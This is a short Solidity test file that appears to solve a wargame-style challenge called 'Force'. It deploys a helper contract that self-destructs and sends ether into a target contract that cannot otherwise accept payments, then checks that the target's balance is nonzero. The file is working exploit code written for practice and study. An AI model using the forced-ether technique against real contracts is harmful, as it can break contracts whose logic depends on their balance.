// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Attack.sol";
import "./Force.sol";

contract Suicidal {
  function die(address target) public {
    selfdestruct(payable(target));
  }

  receive() payable external {}
}

contract ForceAttack is Attack {
  Suicidal private _suicidal;
  Force private _force;

  function setUp() public {
    vm.prank(owner);
    _force = new Force();
  }

  function test_attack() public {
    vm.startPrank(attacker);

    _suicidal = new Suicidal();

    payable(address(_suicidal)).transfer(1);

    _suicidal.die(address(_force));

    /*** Validation ***/
    assertFinished(address(_force));
  }

  function validateInstance(address payable _instance, address _player) override public view returns (bool) {
    _player;
    Force instance = Force(_instance);
    return address(instance).balance > 0;
  }
}
